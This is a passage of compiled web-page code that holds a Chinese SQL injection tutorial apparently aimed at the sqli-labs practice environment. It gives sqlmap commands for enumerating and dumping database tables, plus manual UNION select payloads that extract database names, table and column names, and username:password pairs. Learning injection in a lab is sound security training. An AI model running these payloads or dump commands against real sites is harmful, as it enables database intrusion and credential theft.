python sqlmap.py -u &quot;http://localhost/Less-2/?id=1&quot; -D &quot;test&quot; -T &quot;t1&quot; -C&quot;id,name,pass&quot; --dump
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h6 id="post型注入方式一" tabindex="-1"><a class="header-anchor" href="#post型注入方式一" aria-hidden="true">#</a> POST型注入方式一</h6><p>1.首先用Burp抓包，然后将抓取到的内容保存在一个txt文件中。</p><img src="`+o+`"><p>2.注入流程：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>1.查看所有数据库
python sqlmap.py -r C:\\Users\\XY\\Desktop\\1.txt -p uname  --random-agent --dbs

2.查看test数据库下的所有表
python sqlmap.py -r C:\\Users\\XY\\Desktop\\1.txt -p uname -D &quot;test&quot; --tables 

3.查看test数据库中t1表中的所有列
python sqlmap.py -r C:\\Users\\XY\\Desktop\\1.txt -p uname -D &quot;test&quot; -T &quot;t1&quot; --columns 

4.查看test数据库中t1表中id列，name列，pass列的所有数据
python sqlmap.py -r C:\\Users\\XY\\Desktop\\1.txt -p uname -D &quot;test&quot; -T &quot;t1&quot; -C &quot;id,name,pass&quot; --dump
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h6 id="post型注入方式二-自动搜索表单的方式" tabindex="-1"><a class="header-anchor" href="#post型注入方式二-自动搜索表单的方式" aria-hidden="true">#</a> POST型注入方式二：自动搜索表单的方式</h6><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>python sqlmap.py -u &quot;http://localhost/Less-12/index.php&quot; --forms
python sqlmap.py -u &quot;http://localhost/Less-12/index.php&quot; --forms --dbs
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><h6 id="post注入方式三-直接填post请求" tabindex="-1"><a class="header-anchor" href="#post注入方式三-直接填post请求" aria-hidden="true">#</a> POST注入方式三：直接填post请求</h6><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>python sqlmap.py -u &quot;http://localhost:8089/Less-11/&quot; --method  post --data &quot;uname=123&#39;&amp;passwd=123&amp;submit=Submit&quot; -p uname

python sqlmap.py -u &quot;http://192.168.200.129/results.php&quot; --data &quot;search=1&quot; --dbs
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>`,50);function K(V,$){const s=r("ExternalLinkIcon");return d(),t("div",null,[p,e("p",null,[a("数据库排行："),e("a",v,[a("https://db-engines.com/en/ranking"),n(s)])]),b,e("ol",null,[g,e("li",null,[x,_,f,e("p",null,[a("例如： "),e("a",q,[a("http://localhost/Less-2/index.php?id=1"),n(s)]),a(" order by "),y])]),e("li",null,[e("p",null,[a("判断回显点 union 回显点：回显点就是 SQL 查询结果显示在页面上位置,有回显点的 SQL 注入叫做回显点注入 例如： "),e("a",L,[a("http://localhost/Less-2/index.php?id=-1"),n(s)]),a(" union select 1,2,3 "),S,a(" 注意：为了不让前面那条sql语句执行成功从而掩盖回显点必须让前一条错误执行，这里用-1")])]),e("li",null,[e("p",null,[a("信息收集 数据库版本：version() 数据库版本；注意：5.0以下为低版本，无相关系统库；5.0以上为高版本，有系统库。 数据库名：database() 当前数据库名 例如： "),e("a",w,[a("http://localhost/Less-2/index.php?id=-1"),n(s)]),a(" union select 1,version(),database()")])]),e("li",null,[e("p",null,[a("如果有系统库，则可以： 查找当前数据库的所有表名： "),e("a",k,[a("http://localhost/Less-2/index.php?id=-1"),n(s)]),a(" union select 1,group_concat("),T,a("),3 from "),Q,a(" where "),A,a("="),E]),e("p",null,[a("查询user表里的所有字段： "),e("a",M,[a("http://localhost/Less-2/index.php?id=-1"),n(s)]),a(" union select 1,group_concat("),C,a("),3 from "),O,a(" where table_name="),I]),P])]),e("p",null,[a("​ 查询user表里的username和password ​ "),e("a",G,[a("http://localhost/Less-2/index.php?id=-1"),n(s)]),a(" ​ union select 1,2,(select group_concat(username,0x3a,password)from users) ​ 或 ​ "),e("a",X,[a("http://localhost/Less-2/index.php?id=-1"),n(s)]),a(" ​ union select 1,2,group_concat(username,0x3a,password)from "),B]),N,e("p",null,[a("许多网页链接有类似的结构 "),e("a",D,[a("http://xxx.com/users.php?id=1"),n(s)]),a(" 基于此种形式的注入，一般被叫做数字型注入点，缘由是其注入点 id 类型为数字，在大多数的网页中，诸如 查看用户个人信息，查看文章等，大都会使用这种形式的结构传递id等信息，交给后端，查询出数据库中对应的信息，返回给前台")]),z,e("p",null,[a("网页链接有类似的结构 "),e("a",F,[a("http://xxx.com/users.php?name=admin"),n(s)]),a(" 这种形式，其注入点 name 类型为字符类型，所以叫字符型注入点。")]),U,H,R,e("ul",null,[e("li",null,[a("Base64是网络上最常见的用于传输8Bit"),e("a",W,[a("字节码"),n(s)]),a("的编码方式之一，Base64就是一种基于64个可打印字符来表示"),e("a",Y,[a("二进制"),n(s)]),a("数据的方法。")])]),j])}const J=l(h,[["render",K],["__file","SQL注入.html.vue"]]);export{J as default};
